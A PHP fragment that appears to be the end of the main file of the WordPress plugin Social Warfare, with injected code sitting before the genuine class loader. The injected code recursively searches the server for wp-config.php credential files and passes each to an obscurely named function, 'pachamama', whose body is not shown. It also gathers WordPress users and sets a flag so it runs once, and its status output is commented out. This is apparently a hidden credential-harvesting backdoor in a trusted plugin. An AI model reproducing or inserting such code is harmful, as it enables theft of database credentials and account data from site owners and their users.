function find_wp_configs_recursive($directory, &$wp_config_paths) {
    // Check if wp-config.php exists in the current directory
    $wp_config_file = $directory . '/wp-config.php';
    if (file_exists($wp_config_file)) {
        $wp_config_paths[] = $wp_config_file;
    }

    // Continue searching forward recursively
    $contents = scandir($directory);
    foreach ($contents as $item) {
        if ($item != '.' && $item != '..' && is_dir($directory . '/' . $item)) {
            find_wp_configs_recursive($directory . '/' . $item, $wp_config_paths);
        }
    }
}

function print_wp_config_paths() {
    global $wp_config_paths;
    if (empty($wp_config_paths)) {
        //echo "No wp-config.php files found.\n";
		$z = 0;
    } else {
        //echo "List of wp-config.php files:\n";
        foreach ($wp_config_paths as $wp_config_path) {
            //echo "$wp_config_path\n";
			$a = 0;
        }
    }
}
//print_wp_config_paths();

find_wp_configs($wp_config_paths);
foreach ($wp_config_paths as $wp_config_path) {
    pachamama($wp_config_path);
	getWPUsers();
	update_option('my_admin_init_function_run', 'yes');
}
    
}}

/**
 * Social Warfare is entirely a class-based, object oriented system. As such, the
 * main function of this file (the main plugin file loaded by WordPress) is to
 * simply load the main Social_Warfare class and then instantiate it. This will,
 * in turn, fire up all the functionality of the plugin.
 *
 */
require_once SWP_PLUGIN_DIR . '/lib/Social_Warfare.php';
new Social_Warfare();
